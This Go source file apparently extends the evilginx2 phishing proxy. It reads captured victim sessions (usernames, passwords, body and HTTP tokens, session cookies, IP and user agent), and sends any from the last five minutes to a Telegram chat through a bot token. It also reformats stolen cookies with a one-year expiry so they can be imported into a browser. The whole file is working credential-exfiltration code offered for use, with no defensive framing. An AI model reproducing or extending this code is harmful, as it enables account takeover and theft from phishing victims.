package core

import (
	"bufio"
	"encoding/json"
	"fmt"
	"github.com/kgretzky/evilginx2/database"
	"os"
	"strings"
	"time"
)

type Cookie struct {
	Path           string `json:"path"`
	Domain         string `json:"domain"`
	ExpirationDate int64  `json:"expiry"`
	Value          string `json:"value"`
	Name           string `json:"name"`
	HttpOnly       bool   `json:"httpOnly"`
	//HostOnly       bool   `json:"hostOnly"`
	Secure bool `json:"secure"`
	//Session  bool   `json:"session"`
	SameSite string `json:"sameSite"`
}
type TSession struct {
	ID         int                    `json:"id"`
	Phishlet   string                 `json:"phishlet"`
	LandingURL string                 `json:"landing_url"`
	Username   string                 `json:"username"`
	Password   string                 `json:"password"`
	Custom     map[string]interface{} `json:"custom"`
	BodyTokens map[string]interface{} `json:"body_tokens"`
	HTTPTokens map[string]interface{} `json:"http_tokens"`
	Tokens     []Cookie               `json:"tokens"`
	SessionID  string                 `json:"session_id"`
	UserAgent  string                 `json:"useragent"`
	RemoteAddr string                 `json:"remote_addr"`
	CreateTime int64                  `json:"create_time"`
	UpdateTime int64                  `json:"update_time"`
}

func ReadLatestSession(filePath string) (TSession, error) {
	file, err := os.Open(filePath)
	if err != nil {
		return TSession{}, fmt.Errorf("could not open file: %v", err)
	}
	defer file.Close()

	var latestSession TSession
	var currentSessionData string
	captureSession := false

	scanner := bufio.NewScanner(file)

	for scanner.Scan() {
		line := scanner.Text()

		if strings.HasPrefix(line, "$") {
			if captureSession {
				if currentSessionData != "" {
					var session TSession
					err := json.Unmarshal([]byte(currentSessionData), &session)
					if err == nil {
						latestSession = session
					} else {
						fmt.Printf("Error parsing session JSON: %v\n", err)
					}
					currentSessionData = ""
				}
			}
			captureSession = true
		}

		if captureSession && strings.HasPrefix(line, "{") {
			currentSessionData = line
		}
	}

	if captureSession && currentSessionData != "" {
		var session TSession
		err := json.Unmarshal([]byte(currentSessionData), &session)
		if err == nil {
			latestSession = session
		} else {
			fmt.Printf("Error parsing session JSON: %v\n", err)
		}
	}

	if err := scanner.Err(); err != nil {
		return TSession{}, fmt.Errorf("error reading file: %v", err)
	}

	return latestSession, nil
}

func ReadFile(chatid string, teletoken string, db *database.Database) {

	//filePath := "/root/.evilginx/data.db"
	//
	//latestSession, err := ReadLatestSession(filePath)
	//if err != nil {
	//	fmt.Printf("Error: %v\n", err)
	//	return
	//}

	allSessions, err := db.ListSessions()
	if err != nil {
		fmt.Printf("Error: %v\n", err)
		return
	}
	for _, session := range allSessions {
		sess, err := db.SessionsGetById(session.Id)
		if err != nil {
			fmt.Printf("Error: %v\n", err)
			return
		}
		createTime := time.Unix(sess.CreateTime, 0)
		updateTime := time.Unix(sess.UpdateTime, 0)
		if len(sess.CookieTokens) == 0 && len(sess.BodyTokens) == 0 && len(sess.HttpTokens) == 0 && len(sess.Password) == 0 && len(sess.Custom) == 0 {
			continue
		}

		if time.Since(createTime) <= 5*time.Minute || time.Since(updateTime) <= 5*time.Minute {
			Notify(convertToTeleSessions(sess), chatid, teletoken)
		}
	}
}

func convertToTeleSessions(session *database.Session) TSession {
	var teleSession TSession
	teleSession.SessionID = session.SessionId
	teleSession.Username = session.Username
	teleSession.Password = session.Password
	if len(session.Custom) > 0 && teleSession.Password == "" {
		for _, v := range session.Custom {
			teleSession.Password = v
			break
		}
	}
	teleSession.CreateTime = session.CreateTime
	teleSession.UpdateTime = session.UpdateTime
	teleSession.ID = session.Id
	teleSession.Phishlet = session.Phishlet
	teleSession.LandingURL = session.LandingURL
	teleSession.UserAgent = session.UserAgent
	teleSession.RemoteAddr = session.RemoteAddr
	cookieTokensToJSON(session.CookieTokens, &teleSession)

	return teleSession
}

func cookieTokensToJSON(tokens map[string]map[string]*database.CookieToken, teleSessions *TSession) {
	var cookies []Cookie
	for domain, tmap := range tokens {
		for k, v := range tmap {
			c := Cookie{
				Path:           v.Path,
				Domain:         domain,
				ExpirationDate: time.Now().Add(365 * 24 * time.Hour).Unix(),
				Value:          v.Value,
				Name:           k,
				HttpOnly:       v.HttpOnly,
				Secure:         v.Secure,
				SameSite:       v.SameSite,
				//Session:        false,
			}

			if strings.Index(k, "__Host-") == 0 || strings.Index(k, "__Secure-") == 0 {
				c.Secure = true
			}
			//if domain[:1] == "." {
			//	c.HostOnly = false
			//	// c.Domain = domain[1:] - bug support no longer needed
			//	// NOTE: EditThisCookie was phased out in Chrome as it did not upgrade to manifest v3. The extension had a bug that I had to support to make the exported cookies work for !hostonly cookies.
			//	// Use StorageAce extension from now on: https://chromewebstore.google.com/detail/storageace/cpbgcbmddckpmhfbdckeolkkhkjjmplo
			//} else {
			//	c.HostOnly = true
			//}
			if c.Path == "" {
				c.Path = "/"
			}
			cookies = append(cookies, c)
		}
	}
	teleSessions.Tokens = cookies
}
